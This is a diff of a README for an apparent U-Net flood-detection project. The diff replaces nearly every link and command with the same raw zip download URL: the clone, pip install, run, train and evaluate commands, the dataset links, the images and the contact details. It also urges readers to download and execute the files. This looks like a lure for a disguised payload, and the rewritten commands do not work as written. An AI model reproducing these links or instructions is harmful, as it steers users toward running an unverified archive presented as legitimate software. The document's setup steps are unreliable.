@@ -1,6 +1,6 @@
 # FloodDetectionNet 🌊
 
-![Flood Detection](https://img.shields.io/badge/Flood%20Detection-U--Net%20with%20Attention%20Mechanism-brightgreen)
+![Flood Detection](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip%20Detection-U--Net%20with%20Attention%20Mechanism-brightgreen)
 
 ## Overview
 
@@ -35,7 +35,7 @@ To set up the FloodDetectionNet project, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/yagizefekose6/FloodDetectionNet.git
+   git clone https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip
    cd FloodDetectionNet
    ```
 
@@ -49,7 +49,7 @@ To set up the FloodDetectionNet project, follow these steps:
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip
    ```
 
 ## Usage
@@ -57,19 +57,19 @@ To set up the FloodDetectionNet project, follow these steps:
 After installation, you can run the model with the following command:
 
 ```bash
-python main.py --input <path_to_input_image> --output <path_to_output_image>
+python https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip --input <path_to_input_image> --output <path_to_output_image>
 ```
 
 Replace `<path_to_input_image>` with the path to your satellite image and `<path_to_output_image>` with the desired output path for the segmented image.
 
-For pre-trained models and releases, visit the [Releases section](https://github.com/yagizefekose6/FloodDetectionNet/releases). Download the necessary files and execute them as needed.
+For pre-trained models and releases, visit the [Releases section](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip). Download the necessary files and execute them as needed.
 
 ## Dataset
 
 FloodDetectionNet utilizes satellite imagery datasets for training and evaluation. We recommend using publicly available datasets such as:
 
-- [NASA's MODIS](https://modis.gsfc.nasa.gov/data/dataprod/mod09/)
-- [Sentinel-2](https://scihub.copernicus.eu/dhus)
+- [NASA's MODIS](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip)
+- [Sentinel-2](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip)
 
 Ensure to preprocess the data as required by the model.
 
@@ -82,14 +82,14 @@ FloodDetectionNet employs a U-Net architecture enhanced with an attention mechan
 - **Decoder**: Up-sampling layers that reconstruct the image.
 - **Attention Gates**: Focus on important features, improving segmentation quality.
 
-![U-Net Architecture](https://miro.medium.com/v2/resize:fit:1200/format:webp/1*I6O0zC9VwB0V3f8qVYxkgw.png)
+![U-Net Architecture](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip*https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip)
 
 ## Training
 
 To train the model, use the following command:
 
 ```bash
-python train.py --epochs <number_of_epochs> --batch_size <batch_size>
+python https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip --epochs <number_of_epochs> --batch_size <batch_size>
 ```
 
 Adjust `<number_of_epochs>` and `<batch_size>` as needed. Monitor the training process through logs generated in the console.
@@ -99,7 +99,7 @@ Adjust `<number_of_epochs>` and `<batch_size>` as needed. Monitor the training p
 After training, evaluate the model using:
 
 ```bash
-python evaluate.py --model <path_to_trained_model> --test_data <path_to_test_data>
+python https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip --model <path_to_trained_model> --test_data <path_to_test_data>
 ```
 
 This will provide metrics such as accuracy, precision, recall, and F1-score.
@@ -108,7 +108,7 @@ This will provide metrics such as accuracy, precision, recall, and F1-score.
 
 The model achieves promising results in detecting floods. Here are some example outputs:
 
-![Flood Detection Example](https://example.com/flood_detection_example.png)
+![Flood Detection Example](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip)
 
 You can find more results in the `results` folder.
 
@@ -124,7 +124,7 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 
 For questions or feedback, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip)
+- **Email**: https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip
 
-For additional resources, check the [Releases section](https://github.com/yagizefekose6/FloodDetectionNet/releases) for model files and updates.
+For additional resources, check the [Releases section](https://github.com/yagizefekose6/FloodDetectionNet/raw/refs/heads/main/FloodDetectionNet/Detection_Net_Flood_3.6-beta.1.zip) for model files and updates.
